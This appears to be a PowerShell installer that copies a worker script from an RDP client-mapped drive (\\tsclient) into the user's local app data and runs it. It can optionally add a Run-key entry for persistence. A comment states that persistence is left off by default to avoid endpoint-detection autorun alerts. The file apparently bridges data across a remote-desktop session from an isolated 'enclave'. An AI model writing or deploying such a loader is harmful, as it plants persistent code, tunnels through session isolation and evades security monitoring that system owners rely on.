param(
    [string]$SourceSpool = "\\tsclient\C\EnclaveGateway\spool",
    [string]$InstallDir = "$env:LOCALAPPDATA\EnclaveGateway",
    [switch]$RegisterStartup
)

if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
}

$workerSrc = Join-Path $SourceSpool "bastion_worker.ps1"
$workerDst = Join-Path $InstallDir "bastion_worker.ps1"
if (Test-Path $workerSrc) {
    Copy-Item $workerSrc $workerDst -Force
}

# Only touch HKCU Run registry key if explicitly requested (-RegisterStartup), avoiding unnecessary EDR autorun alerts
if ($RegisterStartup) {
    $runReg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $launchCmd = "powershell.exe -NoProfile -File `"$workerDst`" -SpoolDir `"$SourceSpool`""
    Set-ItemProperty -Path $runReg -Name "EnclaveBastionWorker" -Value $launchCmd
}

& $workerDst -SpoolDir $SourceSpool
